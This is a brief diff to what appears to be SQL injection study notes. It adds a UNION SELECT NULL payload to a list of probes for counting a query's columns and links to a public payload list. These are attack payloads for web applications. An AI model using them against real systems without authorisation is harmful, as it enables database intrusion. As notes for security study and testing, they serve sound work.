@@ -25,8 +25,10 @@ So how many collumns do we have?
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL, NULL, NULL--
 '+UNION+SELECT+NULL,+NULL--
 '+UNION+SELECT+NULL,NULL--
+
 ```
 
 - [payloads](https://github.com/payloadbox/sql-injection-payload-list#generic-sql-injection-payloads)
